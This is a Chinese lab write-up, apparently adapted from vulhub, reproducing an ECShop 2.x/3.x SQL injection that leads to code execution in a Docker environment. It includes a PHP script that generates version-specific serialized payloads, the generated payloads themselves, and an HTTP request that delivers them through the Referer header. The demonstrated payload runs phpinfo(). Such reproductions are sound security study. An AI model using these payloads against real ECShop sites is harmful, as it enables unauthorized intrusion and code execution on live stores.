# ECShop 2.x/3.x SQL注入/任意代码执行漏洞

## 环境搭建

执行如下命令启动ecshop 2.7.3与3.6.0：

```plain
docker compose up -d
```

环境启动后，访问http://your-ip:8080将看到2.7.3的安装页面，访问http://your-ip:8081将看到3.6.0的安装页面。

依次安装二者，mysql地址填写mysql，mysql账户与密码均为root，数据库名随意填写，但2.7.3与3.6.0的数据库名不能相同。如图：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780844555815-50c53bb9-18c6-4dbf-b107-f33270b675a9.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780844556029-b1258c2c-59da-4779-bbb4-7bd9eabcafda.png)

## 漏洞复现

[https://github.com/vulhub/vulhub/blob/master/ecshop/xianzhi-2017-02-82239600/README.zh-cn.md#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0](https://github.com/vulhub/vulhub/blob/master/ecshop/xianzhi-2017-02-82239600/README.zh-cn.md#漏洞复现#tdsub)

我编写了一个脚本，可以生成2.x和3.x的POC：

POC脚本：

```plain
<?php
$shell = bin2hex("{\$asd'];phpinfo\t();//}xxx");
$id = "-1' UNION/*";
$arr = [
"num" => sprintf('*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -', bin2hex($id), $shell),
"id" => $id
];

$s = serialize($arr);

$hash3 = '45ea207d7a2b68c49582d2d22adf953a';
$hash2 = '554fcae493e564ee0dc75bdf2ebf94ca';

echo "POC for ECShop 2.x: \n";
echo "{$hash2}ads|{$s}{$hash2}";
echo "\n\nPOC for ECShop 3.x: \n";
echo "{$hash3}ads|{$s}{$hash3}";
POC for ECShop 2.x: 
554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca

POC for ECShop 3.x: 
45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780844556049-f5279e53-8075-4a38-b279-16f26c33b828.png)

生成的POC，放在Referer里发送：

```plain
GET /user.php?act=login HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1
Referer: [POC HERE]
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

2.x的执行结果

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780844555964-3955e6be-594c-4a07-a2ea-6e47e865d37e.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780844556079-d2f96c44-1659-4102-9b8c-97700c6fe2b6.png)

3.x的执行结果

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780844557398-52fad129-4a60-440e-905e-c254c10cb177.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780844557578-e786a3ba-a473-4004-a9d8-4bfd90a350c5.png)